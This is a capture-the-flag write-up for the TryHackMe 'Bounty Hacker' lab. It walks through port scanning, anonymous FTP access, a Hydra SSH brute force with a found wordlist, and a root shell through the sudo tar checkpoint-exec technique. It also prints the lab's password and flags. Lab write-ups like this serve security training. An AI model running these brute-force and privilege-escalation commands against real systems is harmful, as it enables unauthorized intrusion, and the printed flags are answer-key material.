# Bounty Hacker — TryHackMe Writeup

## Overview

This machine demonstrates a classic attack chain:

* Service enumeration
* Anonymous FTP access
* Credential harvesting
* SSH brute-force
* Privilege escalation via misconfigured sudo

---

##  Initial Enumeration

First, I checked the web service:

```bash
curl http://10.80.180.131
```

The page did not reveal any useful information, so I proceeded with deeper enumeration.

---

##  Port Scanning

I performed a scan using Nmap:

```bash
nmap -sC -sV -p21,22,80 10.80.180.131
```

### Results:

* **21/tcp** — FTP (vsftpd 3.0.5)

  * Anonymous login allowed
* **22/tcp** — SSH (OpenSSH 8.2p1)
* **80/tcp** — HTTP (Apache 2.4.41)

 The FTP service immediately stands out as a potential entry point.

---

##  Web Enumeration

Using a directory brute-force tool:

```bash
dirsearch -u http://10.80.180.131
```

Additional pages were discovered, which helped identify useful information about the system and hinted at FTP usage.

---

##  FTP Access

Connecting to FTP:

```bash
ftp 10.80.180.131
```

Login:

```
Username: anonymous
Password: anonymous
```

Inside the FTP server, I found a file:

* `locks.txt` — contains a list of possible passwords

Downloaded with:

```bash
get locks.txt
```

---

##  Credential Discovery

While enumerating further, I also found a note:

```bash
cat task.txt
```

Content:

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

 This suggests a valid username: **lin**

---

##  SSH Brute Force

Using Hydra to brute-force SSH:

```bash
hydra -l lin -P locks.txt ssh://10.80.180.131
```

### Credentials found:

* **Username:** lin
* **Password:** RedDr4gonSynd1cat3

---

##  Gaining Access

Login via SSH:

```bash
ssh lin@10.80.180.131
```

After successful login, I searched for the user flag:

```bash
cat ~/Desktop/user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

---

##  Privilege Escalation

To escalate privileges, I checked sudo permissions:

```bash
sudo -l
```

This revealed that the user can run `tar` with sudo privileges.

---

##  Exploiting tar (GTFOBins)

Using the GTFOBins technique:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

👉 This spawns a root shell.

Verify:

```bash
whoami
```

```
root
```

---

##  Root Flag

```bash
cat /root/root.txt
```

```
THM{80UN7Y_h4cK3r}
```

---

## 🧠 Conclusion

### Attack Path:

1. Nmap scan → discover services
2. Anonymous FTP access
3. Download password list
4. Identify username (`lin`)
5. Brute-force SSH credentials
6. Gain user access
7. Abuse sudo misconfiguration (`tar`)
8. Get root access

### Key Vulnerabilities:

* Anonymous FTP enabled
* Weak password policy
* Exposed password wordlist
* Misconfigured sudo permissions (`tar` allowed)

---

## 🛠️ Tools Used

* Nmap
* Dirsearch
* FTP
* Hydra
* SSH
* GTFOBins

---
